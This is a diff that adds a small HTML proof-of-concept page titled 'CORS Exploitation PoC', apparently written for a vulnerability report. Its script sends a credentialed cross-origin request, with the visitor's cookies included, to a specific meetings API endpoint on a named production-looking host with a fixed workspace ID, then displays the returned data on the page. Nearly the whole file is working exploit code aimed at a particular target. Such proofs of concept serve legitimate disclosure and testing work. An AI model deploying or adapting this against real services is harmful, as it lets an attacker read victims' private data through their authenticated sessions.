@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CORS Exploitation PoC</title>
+</head>
+<body>
+    <h1>CORS Exploitation PoC</h1>
+    <button id="exploitButton">Exploit CORS</button>
+    <pre id="response"></pre>
+
+    <script>
+        document.getElementById('exploitButton').onclick = function() {
+            fetch('https://uc-connector.intprod.bluescape.io/api/v3/chime/meetings?workspaceId=mcYcTPPos-jN34ZXWKhC', {
+                method: 'GET',
+                credentials: 'include'  // This sends cookies along with the request
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById('response').innerText = data;  // Display the response on the page
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        };
+    </script>
+</body>
+</html>
